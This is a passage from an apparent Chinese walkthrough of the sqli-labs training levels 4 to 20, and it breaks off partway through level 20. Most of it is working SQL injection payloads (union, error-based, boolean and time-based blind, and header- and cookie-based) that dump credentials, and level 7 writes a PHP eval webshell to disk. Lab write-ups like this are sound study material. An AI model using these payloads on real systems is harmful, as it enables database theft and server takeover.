title="4(GET方式的字符型的联合注入)"></a>4(GET方式的字符型的联合注入)</h2><ol><li><p>判断是否存在<strong>SQL注入</strong><br>方法是：<br>输入 ?id&#x3D;1”后是否有<strong>报错提示</strong><br>报错提示为：<br><img src="/simg/sqli-labs_4.png" alt="报错信息"></p></li><li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由此报错信息的关键部分：<br>near ‘“1””) LIMIT 0,1’ at line 1<br>可知，sql语句是双引号字符型且有括号。<br>所以我们也需要闭合双引号和括号。<br>则构造语句如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=2&quot;)--+</span><br></pre></td></tr></table></figure></li></ol><p>由于之后的思路步骤和第1，2关一样，之后仅放答案。</p><ol start="3"><li>猜解SQL查询语句中的<strong>字段数</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) order by 3--+</span><br></pre></td></tr></table></figure></li><li><strong>爆出显示位</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,3--+</span><br></pre></td></tr></table></figure></li><li>获取当前<strong>数据库名和数据库版本号</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,database(),version()--+</span><br></pre></td></tr></table></figure></li><li><strong>爆表</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure></li><li><strong>爆字段名</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure></li><li><strong>爆数据</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;) union select 1,2,group_concat(username ,id , password) from users--+</span><br></pre></td></tr></table></figure></li></ol><h2 id="5-6-GET方式的报错注入"><a href="#5-6-GET方式的报错注入" class="headerlink" title="5-6(GET方式的报错注入)"></a>5-6(GET方式的报错注入)</h2><ol><li><p>判断是否存在<strong>SQL注入</strong><br>和前几关一致，这里不过多阐述。<br>输入?id&#x3D;1”有报错信息。<br>报错信息为：<br><img src="/simg/sqli-labs_6.png" alt="sqli-labs_6输入?id=1&quot;时的报错信息"></p></li><li><p>判断SQL注入类型是<strong>字符型</strong>还是<strong>数字型</strong><br>由报错信息near ‘“1”” LIMIT 0,1’ at line 1可知是双引号字符型。<br>构造语句?id&#x3D;1”–+</p></li><li><p>猜解SQL查询语句中的<strong>字段数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure><p>可得字段数为3</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由于无法返回正常信息，所以不能使用union联合查询<br>使用报错注入常用的函数即可（<a href="https://truthnian.github.io/2022/11/08/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/">常用函数</a>）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(database(),0x7e,version())),0x23),1)--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&quot;and updatexml(1,concat(0x23,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x23),1)--+</span><br></pre></td></tr></table></figure><p>因为updatexml()函数最多只能显示32个字符，无法显示到所需的数据，所以不能只写where table_name&#x3D;’users’  应该再加一个限定到当前数据库。</p></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;and updatexml(1,concat(0x7e,(select concat(username,0x7e,password) from users limit 0,1),0x23),1)--+</span><br></pre></td></tr></table></figure><p>因为updatexml()函数最多只能显示32个字符，所需数据可能无法显示完全，因此需要使用limit限制每行显示一组数据。<br><strong>limit</strong>简单解释：<br>limit 3,1  表示返回从第3行起的1行数据，逗号之前的值对应OFFSET，逗号之后的值对应LIMIT。<br>注意：limit第一个被检索的行是第0行，当检索完后不会显示数据</p></li></ol><h2 id="7-GET方式的读写文件"><a href="#7-GET方式的读写文件" class="headerlink" title="7(GET方式的读写文件)"></a>7(GET方式的读写文件)</h2><h4 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h4><ol><li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in…. Use outfile……<br>输入?id&#x3D;1’ 显示：You have an error in your SQL syntax<br>输入?id&#x3D;1’--+  依然报错，说明注入方式不是单纯的单引号<br>输入?id&#x3D;1’’  显示正确，说明是包含了单引号的字符型注入<br>继续不断尝试…<br>最终，输入?id&#x3D;1’))--+  显示正确，注入语句构造成功<br>（说明：这种注入需要不断尝试，并积累经验）</p></li><li><p>猜解SQL查询语句中的<strong>字段数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;order by 4--+</span><br></pre></td></tr></table></figure><p>可得字段数为3</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong><br>由之前的提示信息Use outfile……可知，<br>这里可以利用outfile的文档来查看回显<br>（说明：</p></li></ol><ul><li>读取文档：load_file()<br>用法：select load_file(‘文件路径’)</li><li>导出文档：into outfile()<br>用法：select ‘string’ into outfile ‘文件路径\\文件名’<br>注意：路径要用双斜线分开）</li></ul><p><strong>但是！</strong><br>在使用文档之前必须要先获得<strong>权限</strong>。</p><ul><li>首先，打开sqli-labs使用的MySQL的my.ini。查找secure_file_priv<br>如果存在，那么修改为secure_file_priv&#x3D;””<br>否则，在[mysqld]下，新增为secure_file_priv&#x3D;””</li><li>然后，找到刚刚修改的MySQL的bin目录，打开管理员权限的cmd，将cmd的位置转到bin目录下，输入以下指令：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line">输入该数据库root用户密码</span><br><span class="line">show variables like &quot;%secure%&quot;;</span><br></pre></td></tr></table></figure>secure_file_priv 一栏的value为空，即是成功</li></ul><p>之后就能愉快地获取库名和版本号了,示例如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;))union select 1,database(),version() into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\database.txt&quot;--+</span><br></pre></td></tr></table></figure><ol start="4"><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) UNION SELECT user(),version(),(select group_concat(table_name) from information_schema.tables where table_schema=&quot;security&quot; ) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\table.txt&quot; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)) UNION SELECT user(),version(),(select group_concat(column_name) from information_schema.columns where table_schema=&quot;security&quot; and table_name=&quot;users&quot; ) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\columns.txt&quot; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;))  UNION SELECT user(),version(),(select group_concat(username,0x23,password) from users) into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\datas.txt&quot; --+</span><br></pre></td></tr></table></figure></li></ol><h4 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h4><p>和第一种的前3步到获得修改文件权限的位置都是一样的。<br>之后是采用<strong>一句话木马</strong>的形式。<br>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;)) union select 1,&quot;&lt;?php @eval($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;,3 into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs-master\\Less-7\\2.txt&quot; --+</span><br></pre></td></tr></table></figure><h2 id="8-GET方式的布尔盲注"><a href="#8-GET方式的布尔盲注" class="headerlink" title="8(GET方式的布尔盲注)"></a>8(GET方式的布尔盲注)</h2><ol><li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 无任何显示，说明是错误的<br>输入?id&#x3D;1’’  显示：You are in………..<br>输入?id&#x3D;1’--+  显示：You are in………..<br>说明构造成功，且是单引号字符型</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong></p></li></ol><ul><li>由于无法显示报错信息，我们需要使用length()函数首先判断数据库名长度<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and length(database())&gt;7--+  返回正确</span><br><span class="line">?id=1&#x27;and length(database())&gt;8--+  返回错误</span><br></pre></td></tr></table></figure>说明数据库名长度为8</li><li>接下来便是一个个判断字符，这里可以使用substr(),mid(),substring(),ord(),ascii()等，选择比较多，任意选取即可<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;114--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr(database(),1,1))&gt;115--+   返回错误</span><br></pre></td></tr></table></figure>说明数据库名第1个字符是s，以此类推，可得数据库名为security<br>数据库版本号也是同理</li></ul><ol start="3"><li><p><strong>爆表</strong><br>道理是类似的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;102--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1))&lt;101--+   返回错误</span><br></pre></td></tr></table></figure><p>说明第一个表名的第1个字符是e，以此类推，可以得到所有表名，最终我们发现关键的表名users<br>这里使用limit的原因是因为一个数据库名中表名很可能不止一个，我们需要依次查询</p></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;106--+   返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))&lt;105--+   返回错误</span><br></pre></td></tr></table></figure><p>说明第一个字段名是i，以此类推，可以得到所有字段名，最终我们发现关键的字段名username,password</p></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;67--+  返回正确</span><br><span class="line">?id=1&#x27;and ord(substr((select username from users limit 0,1),1,1))&gt;68--+  返回错误</span><br></pre></td></tr></table></figure><p>说明第一个用户名是D，以此类推，可以得到所有用户名和密码。</p></li></ol><h2 id="9-10-GET方式的时间盲注"><a href="#9-10-GET方式的时间盲注" class="headerlink" title="9-10(GET方式的时间盲注)"></a>9-10(GET方式的时间盲注)</h2><ol><li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>输入?id&#x3D;1  显示：You are in………..<br>输入?id&#x3D;1’ 显示：You are in………..<br>输入?id&#x3D;1” 显示：You are in………..<br>此时我们应该发现端倪，页面可能不会返回任何信息<br>输入?id&#x3D;1 and sleep(5)--+  页面迅速显示<br>输入?id&#x3D;1’and sleep(5)--+  页面延迟了5s，说明的确是应当使用时间盲注<br>输入?id&#x3D;1’’and sleep(5)--+  页面迅速显示<br>说明是单引号字符型注入</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select database()))&gt;7,sleep(5),1)--+    页面迅速显示</span><br><span class="line">?id=1&#x27;and if(length((select database()))&gt;8,sleep(5),1)--+    页面延迟了5s</span><br></pre></td></tr></table></figure><p>说明数据库名长度是8个字符<br>版本号以此类推</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;115,sleep(5),1)--+   页面迅速显示</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select database()),1,1))&gt;114,sleep(5),1)--+   页面延迟了5s</span><br></pre></td></tr></table></figure><p>最终尝试完后可得数据库名是security</p></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(table_name) from information_schema.tables where table_schema=database()))&gt;13,sleep(5),1)--+</span><br><span class="line">如此判断所有表名长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">再逐一判断表名</span><br></pre></td></tr></table></figure><p>最终尝试完后可得所需表名为users</p></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;and if(length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;))&gt;20,sleep(5),1)--+</span><br><span class="line">判断所有字段名的长度</span><br><span class="line">?id=1&#x27;and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,1))&gt;99,sleep(5),1)--+</span><br><span class="line">逐一判断字段名</span><br></pre></td></tr></table></figure><p>最终出现了我们所需的字段名username, password</p></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and if(length((select group_concat(username,password) from users))&gt;109,sleep(5),1)--+</span><br><span class="line">判断字段内容长度</span><br><span class="line">?id=1&#x27; and if(ascii(substr((select group_concat(username,password) from users),1,1))&gt;50,sleep(5),1)--+</span><br><span class="line">逐一检测内容</span><br></pre></td></tr></table></figure><p>最终得到了所需的数据</p></li></ol><ul><li>第9关和第10关思路相同，不同点是第9关的单引号在第10关换成了双引号</li></ul><h2 id="11-12-POST方式的字符型的联合注入"><a href="#11-12-POST方式的字符型的联合注入" class="headerlink" title="11-12(POST方式的字符型的联合注入)"></a>11-12(POST方式的字符型的联合注入)</h2><ol><li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>猜解方式和之前差不多。这里稍微使用点和之前不一样的方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1 #   万能密码构造成功，返回账户和密码</span><br></pre></td></tr></table></figure><p>说明：这里的注释要使用#，之前的--+不再适用</p></li><li><p>猜解SQL查询语句中的<strong>字段数</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 2 #   返回正确信息</span><br><span class="line">1&#x27; order by 3 #   返回错误信息</span><br></pre></td></tr></table></figure><p>说明字段数为2</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select database(),version() #   返回Your Login name:security  Your Password:5.7.26</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br><span class="line">返回emails,referers,uagents,users</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; #</span><br><span class="line">返回id,username,password</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,group_concat(username,&#x27;:&#x27;,password) from users #  返回用户名和密码</span><br></pre></td></tr></table></figure></li></ol><ul><li>第12关和第11关差不多，只是要用1”) or 1&#x3D;1 #</li></ul><h2 id="13-16-POST方式的时间盲注"><a href="#13-16-POST方式的时间盲注" class="headerlink" title="13-16(POST方式的时间盲注)"></a>13-16(POST方式的时间盲注)</h2><ol><li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) #  登录成功，但没有回显</span><br></pre></td></tr></table></figure><p>构造成功，然后使用时间盲注</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and if(length(database())&gt;7,sleep(10),1) #         判断数据库名长度</span><br><span class="line">admin&#x27;) and if(ascii(substring(database(),1,1))=115,sleep(10),1) #   判断数据库名第一个字符</span><br></pre></td></tr></table></figure><p>以此类推</p></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1); #     判断表名</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=101,sleep(10),1); #     判断字段名</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1); #</span><br><span class="line">判断数据</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>第14关差不多，只是构造方式变成了双引号</p></li><li><p>第15关和第11关差不多</p></li><li><p>第16关和第12关差不多</p></li></ul><h2 id="17-POST方式的报错注入"><a href="#17-POST方式的报错注入" class="headerlink" title="17(POST方式的报错注入)"></a>17(POST方式的报错注入)</h2><ol><li>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>如果不知道源码，去一遍遍尝试，会发现无论是布尔盲注还是时间盲注都无法得到预期结果，因此我们可以采用报错注入。<br>首先，那我们可以从源码中发现，有一个过滤函数check_input，其过滤步骤是：</li></ol><ul><li><code>substr($value,0,15)</code>截断到15位</li><li>单引号，双引号，反斜杠，null自动使用反斜杠转义</li><li>stripslashes()去掉多余的反斜杠<br>然后，passwd没有使用过滤函数过滤，因而可以进行注入。由此可使用报错注入。</li></ul><ol start="2"><li><p>获取当前<strong>数据库名和数据库版本号</strong><br>第一个用户名填写：admin<br>第二个密码填写所需的报错注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;users&#x27;),0x5c),1))#    爆字段名</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users limit 0,1)test),0x7e),1) #  爆用户</span><br><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users where username=&#x27;admin&#x27; limit 0,1)test),0x7e),1) #      爆密码</span><br></pre></td></tr></table></figure></li></ol><h2 id="18-User-Agent方式的报错注入"><a href="#18-User-Agent方式的报错注入" class="headerlink" title="18(User-Agent方式的报错注入)"></a>18(User-Agent方式的报错注入)</h2><ol><li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_18.png" alt="返回情况"><br>返回了ip和user-agent的识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等<br>我们通过源码的check_input可以得知，username和passwd都被过滤了。所以我们不能使用在POST处注入手段。<br>继续检查源码，可以发现这条语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure><p>因此我们可以从user-agent处注入。</p></li><li><p>通过burp抓包注入<br>burp的下载安装配置这里暂且不提，默认已弄好。<br>注意，如果是第一次抓包，会无法抓到，因为浏览器默认是不会抓127.0.0.1的包，需要自己设置。<br>打开Firefox，搜索about:config。<br>然后在访问后的搜索框内搜索 network.proxy.allow_hijacking_localhost，将值改为true</p></li></ol><p>另外还有一种方法，是将127改为自己的内网网址192.168.x.x<br>但这个方法我没成功，所以暂时搁置。</p><p>输入正确的用户名和密码后，在burp抓包，把user-agent的值改为我们需要注入的内容。如下图所示：<br><img src="/simg/sqli-labs_18_3.png" alt=" "></p><ol start="3"><li><p>获取当前<strong>数据库名和数据库版本号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li></ol><h2 id="19-Referer方式的报错注入"><a href="#19-Referer方式的报错注入" class="headerlink" title="19(Referer方式的报错注入)"></a>19(Referer方式的报错注入)</h2><ol><li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_19.png" alt="返回情况"><br>返回了Referer<br>Referer是HTTP头的一个字段，用于告诉服务器该网页是从哪个页面链接过来的<br>这一次，我们在Referer的字段注入。</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li></ol><h2 id="20-Cookie方式的联合注入"><a href="#20-Cookie方式的联合注入" class="headerlink" title="20(Cookie方式的联合注入)"></a>20(Cookie方式的联合注入)</h2><ol><li><p>测试并判断注入类型<br>正常输入了admin之后，我们发现出现了如下界面：<br><img src="/simg/sqli-labs_20.png" alt="返回情况"><br>点击下方的按钮，返回到原来界面<br>接下来我们再次输入admin，并显示到该界面，可以明显看出，cookie字段显示出来。<br>然后我们按F12，点击存储，再点击Cookie下的链接，修改值为admin’<br>刷新后，出现报错，说明存在注入。<br>因此我们可以利用修改cookie的方式进行注入</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;order by 4 #</span></span><br></pre></td></tr></table></figure><p>报错，说明字段数为3</p></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,database(),version() #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 